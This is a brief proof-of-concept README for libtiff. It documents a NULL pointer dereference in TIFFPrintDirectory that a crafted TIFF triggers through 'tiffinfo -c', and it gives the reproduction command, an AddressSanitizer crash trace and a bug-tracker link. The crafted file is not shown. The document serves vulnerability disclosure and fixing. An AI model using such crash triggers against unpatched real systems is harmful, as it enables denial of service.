poc of libtiff
=================


## 1. null pointer dereference of tiffinfo (1-tiffinfo-c-null)

A NULL Pointer Dereference in function TIFFPrintDirectory in tif_print.c
when using tiffinfo tool to print the crafted tiff information.

```
$ tiffinfo -c $FILE

ASAN:SIGSEGV
=================================================================
==172==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f3b8f83a44f bp 0x000000000000 sp 0x7ffd7cacd6b0 T0)
    #0 0x7f3b8f83a44e in TIFFPrintDirectory /src/libtiff/libtiff/tif_print.c:549
    #1 0x402329 in tiffinfo /src/libtiff/tools/tiffinfo.c:461
    #2 0x402329 in main /src/libtiff/tools/tiffinfo.c:150
    #3 0x7f3b8f2ce82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #4 0x402888 in _start (/src/aflbuild/installed/bin/tiffinfo+0x402888)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /src/libtiff/libtiff/tif_print.c:549 TIFFPrintDirectory
==172==ABORTING


```

ref:

http://bugzilla.maptools.org/show_bug.cgi?id=2778
